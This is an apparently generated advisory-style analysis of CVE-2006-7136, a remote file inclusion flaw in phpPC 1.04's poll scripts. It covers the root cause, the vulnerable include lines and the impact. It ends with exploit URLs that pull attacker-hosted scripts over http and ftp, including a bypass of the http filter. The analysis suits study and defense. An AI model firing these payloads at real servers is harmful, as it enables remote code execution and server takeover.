Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-7136

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper input sanitization in the `relativer_pfad` variable used in multiple PHP files (`poll.php`, `poll_kommentar.php`, and `poll_sm.php`) of phpPC 1.04. This allows for Remote File Inclusion (RFI) by injecting malicious URLs.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes files based on user-controlled input (`relativer_pfad`) without sufficient validation. Specifically, the application attempts to filter "http://" and "../" but fails to account for other protocols like "ftp://".
- **Insufficient Input Sanitization:** The code does not properly sanitize the `relativer_pfad` variable before using it in `include` statements.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** By including a remote file containing malicious PHP code, an attacker can execute arbitrary code on the server. This can lead to complete compromise of the server, data theft, defacement, and other malicious activities.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerable parameters (`is_phppc_included`, `relativer_pfad`) are passed through the URL using GET requests.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Knowledge of Vulnerability:** The attacker needs to know the vulnerable parameters and the file paths of the vulnerable php files.
- **Hosting for Malicious Script:** The attacker needs to have access to a server where they can host the malicious PHP code that will be included.

**Specific Vulnerable Files and Code Snippets:**
-   **poll.php**:
```php
    include $relativer_pfad.$file;
    include ($relativer_pfad . "layout_top.inc.php");
```
-   **poll_kommentar.php**:
```php
    include ($relativer_pfad . "lib/functions.inc.php");
    include $relativer_pfad . "poll_titel_kat.inc.php";
```
-   **poll_sm.php**:
```php
    if(substr_count($relativer_pfad,"http://") >= 1 OR substr_count($relativer_pfad,"../") >= 1) $relativer_pfad = "";
    include $relativer_pfad.$file;
    include ($relativer_pfad . "layout_top_sm.inc.php");
```

**Exploitation Examples:**
-   `http://localhost/phppc/poll.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt?`
-   `http://localhost/phppc/poll_kommentar.php?is_phppc_included=1&relativer_pfad=http://attacker/inject.txt ?`
-   `http://localhost/phppc/poll_sm.php?is_phppc_included=1&relativer_pfad=ftp://user:pass@ftp.attacker.ltd/script.txt ?`

**Additional Notes:**
-   The exploit in `poll_sm.php` uses `ftp://` because the check only filters "http://", allowing for the use of other protocols.
